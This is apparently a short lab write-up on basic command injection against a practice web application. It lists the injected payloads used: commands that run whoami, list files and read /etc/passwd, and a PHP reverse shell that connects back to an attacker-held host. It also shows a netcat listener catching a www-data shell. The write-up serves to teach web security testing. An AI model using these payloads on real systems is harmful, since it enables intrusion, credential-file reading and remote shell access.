# Command Injection - Basics

- In the network analysis tab, I am proceeding to conduct command injection to assess the system's vulnerability.

![image](https://github.com/singhx-hub/WebVulnLab/tree/main/assets/126919241/66d01096-35bd-492c-a5c0-5ca6bc3e7e59)

- By utilizing the command `https://<IP>; whoami;echo http/`, I successfully fetched the user information.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/42ce1d0d-aa3f-4cc5-a757-b87d896ae42e) ![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/64a847ce-b6ac-43b3-a6c6-3f829a8b585d)

- By passing the payload `https://<IP>; ls -lah;asd`, I managed to retrieve the files present in the system.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/87e86829-1b7d-4467-960c-cee1cbc12415)
![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/3a1906df-0d44-47e1-a778-986d6799425b)

- By utilizing the command `https://<IP>; cat /etc/passwd;asd` I successfully retrieved the user information.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/432522ce-e64a-4196-b2ac-f3e809a1c4a4)

- By employing the PHP reverse shell `https://<Target IP>; php -r '$sock=fsockopen("LHOST",4242);exec("/bin/sh -i <&3 >&3 2>&3");';asd`, I was able to prompt a reverse shell.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/87bcc2a3-2f00-4db3-9b73-af70191f6c2d)

#### Shell:

```bash
└─$ rlwrap nc -nvlp 4242
listening on [any] 4242 ...
connect to [xxx.xxx.xxx.186] from (UNKNOWN) [xxx.xx.0.4] 59348
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
